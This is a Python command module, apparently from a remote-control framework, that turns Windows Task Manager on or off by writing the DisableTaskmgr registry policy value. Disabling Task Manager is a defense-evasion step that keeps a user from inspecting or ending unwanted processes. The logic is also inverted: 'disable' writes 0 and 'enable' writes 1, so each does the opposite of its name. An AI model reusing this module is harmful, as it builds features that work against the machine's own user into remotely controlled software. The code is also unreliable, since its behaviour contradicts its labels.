import ctypes
import os
import platform
try:
    import winreg
except ImportError:
    winreg = None
from ..commands import Command, CommandArgs, ICommandModule, CommandResult


command_arg_map = {
    Command.ENABLE_TASKMANAGER: None,
    Command.DISABLE_TASKMANAGER: None,
}

class TaskManager(ICommandModule):
    def __init__(self) -> None:
        self.is_elevated = self.check_elevation()
        if self.is_elevated and platform.system() == "Windows":
            sub_key = r"Software\Microsoft\Windows\CurrentVersion\Policies\System"
            self.h = winreg.CreateKeyEx(
                winreg.HKEY_CURRENT_USER, sub_key, reserved=0, access=winreg.KEY_ALL_ACCESS)
        else:
            self.h = None

    def check_elevation(self) -> bool:
        if platform.system() == "Windows":
            try:
                return ctypes.windll.shell32.IsUserAnAdmin()
            except:
                return False
        else:
            return os.geteuid() == 0

    def disable(self) -> CommandResult:
        if platform.system() != "Windows" or not self.is_elevated:
            return CommandResult(success=False, result="Operation not supported or elevated privileges required.")
        self.change_dword(0)
        return CommandResult(success=True, result="Task Manager disabled.")

    def enable(self) -> CommandResult:
        if platform.system() != "Windows" or not self.is_elevated:
            return CommandResult(success=False, result="Operation not supported or elevated privileges required.")
        self.change_dword(1)
        return CommandResult(success=True, result="Task Manager enabled.")

    def change_dword(self, arg0):
        if not self.is_elevated:
            return CommandResult(success=False, result="Elevated privileges required.")
        winreg.SetValueEx(self.h, "DisableTaskmgr", 0, winreg.REG_DWORD, arg0)
        return CommandResult(success=True, result="Task Manager setting updated.")

    def run(self, command: Command, args: CommandArgs = None) -> CommandResult:
        if command == Command.ENABLE_TASKMANAGER:
            return self.enable()
        elif command == Command.DISABLE_TASKMANAGER:
            return self.disable()
        else:
            return CommandResult(success=False, result="Invalid command.")


